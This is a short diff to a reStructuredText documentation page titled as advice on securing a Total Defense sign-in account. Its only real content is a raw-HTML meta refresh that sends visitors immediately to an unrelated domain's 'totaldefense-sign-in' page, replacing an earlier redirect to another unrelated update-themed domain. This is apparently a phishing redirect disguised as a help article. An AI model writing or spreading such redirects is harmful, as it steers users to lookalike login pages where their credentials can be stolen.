@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/totaldefense-sign-in">
 
 How to Keep Your Total Defense Sign-In Account Secure?
 ============================================
